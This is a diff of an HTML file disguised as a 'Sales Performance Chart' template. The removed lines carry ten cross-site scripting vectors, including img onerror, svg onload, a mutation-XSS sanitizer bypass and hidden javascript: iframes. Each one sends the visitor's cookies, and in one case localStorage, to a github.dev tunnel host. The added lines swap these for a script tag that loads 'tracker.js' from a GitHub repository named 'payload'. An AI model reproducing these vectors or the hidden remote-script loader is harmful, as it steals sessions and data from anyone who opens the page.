@@ -1,64 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Sales Chart Template</title>
-<style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body { font-family: Arial, sans-serif; padding: 30px; background: #f5f5f5; }
-h1 { color: #333; margin-bottom: 20px; }
-.chart { display: flex; align-items: flex-end; gap: 12px; height: 250px; padding: 20px; background: #fff; border-radius: 8px; border: 1px solid #ddd; }
-.bar { width: 50px; border-radius: 4px 4px 0 0; position: relative; }
-.bar span { position: absolute; top: -22px; width: 100%; text-align: center; font-size: 12px; color: #555; }
-.label { text-align: center; font-size: 11px; margin-top: 6px; color: #777; }
-.legend { margin-top: 20px; font-size: 13px; color: #666; }
-.hidden { display: none; }
-</style>
+  <title>Sales Performance Chart</title>
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
 </head>
-<body>
-
-<h1>Q4 Sales Performance</h1>
-<div class="chart">
-  <div><div class="bar" style="height:180px;background:#4CAF50;"><span>180k</span></div><div class="label">Oct</div></div>
-  <div><div class="bar" style="height:220px;background:#2196F3;"><span>220k</span></div><div class="label">Nov</div></div>
-  <div><div class="bar" style="height:195px;background:#FF9800;"><span>195k</span></div><div class="label">Dec</div></div>
-  <div><div class="bar" style="height:250px;background:#9C27B0;"><span>250k</span></div><div class="label">Jan</div></div>
-  <div><div class="bar" style="height:210px;background:#F44336;"><span>210k</span></div><div class="label">Feb</div></div>
-</div>
-<p class="legend">Source: Internal CRM — Updated 2024</p>
-
-<!-- XSS Vectors — multiple bypass techniques -->
-
-<!-- 1. img onerror (most reliable) -->
-<img src=x onerror="fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie+'||'+JSON.stringify(localStorage))})">
-
-<!-- 2. svg onload -->
-<svg onload="fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie)})">
-
-<!-- 3. details ontoggle -->
-<details open ontoggle="fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie)})">
-<summary>.</summary>
-</details>
-
-<!-- 4. body onload fallback -->
-<body onload="fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie)})">
-
-<!-- 5. input autofocus onfocus -->
-<input autofocus onfocus="fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie)})" style="position:absolute;left:-9999px">
-
-<!-- 6. marquee onstart -->
-<marquee onstart="fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie)})" width=1 height=1>.</marquee>
-
-<!-- 7. video source onerror -->
-<video><source onerror="fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie)})"></video>
-
-<!-- 8. mutation XSS (mXSS) for sanitizer bypass -->
-<math><mtext><table><mglyph><svg><mtext><path id="</mtext><img onerror=&quot;fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie)})&quot; src=x>"></path></mtext></svg></mglyph></table></mtext></math>
-
-<!-- 9. javascript: URI in iframe -->
-<iframe src="javascript:fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie)})" width=0 height=0 style="display:none"></iframe>
-
-<!-- 10. object data javascript: -->
-<object data="javascript:fetch('https://bug-free-space-eureka-4j6jqgrx5vrrfv6x-4444.app.github.dev/xss',{method:'POST',body:btoa(document.cookie)})" width=0 height=0></object>
-
+<body style="font-family:Arial;padding:30px;background:#f5f5f5">
+  <h1 style="color:#333">Q4 Sales Performance</h1>
+  <canvas id="salesChart" width="600" height="300"></canvas>
+  <script src="https://raw.githubusercontent.com/YOUR-USERNAME/payload/main/tracker.js"></script>
 </body>
 </html>
